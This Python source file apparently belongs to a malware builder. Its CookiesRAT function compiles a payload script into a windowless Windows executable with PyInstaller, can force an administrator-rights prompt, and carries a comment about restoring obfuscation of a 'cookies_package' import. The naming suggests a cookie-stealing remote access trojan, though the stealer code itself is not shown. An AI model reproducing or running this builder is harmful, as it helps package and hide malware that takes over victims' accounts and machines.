import os
import shutil
from cookies_package import *
from util.plugins.common import clear, cleanup
from colorama import Fore




def CookiesRAT(fileName, force_admin):
    clear()
    try:
        # Add back cookies_packge obfusacation after update

        if str(force_admin).lower() == 'yes' or str(force_admin).lower() == 'y':
            print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}{Fore.CYAN}.exe With Force Admin!\n{Fore.RESET}")
            os.system(f"pyinstaller --onefile --noconsole --uac-admin --clean --log-level=INFO -n {fileName} {fileName}.py")
        else:
            print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}.exe Without Force Admin!\n{Fore.RESET}")
            os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -n {fileName} {fileName}.py")

        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        
        cleanup(fileName)

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making exe{Fore.RESET}: {e}')
        cleanup(fileName)

    print(f"\n{Fore.GREEN}Finshed creating payload{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')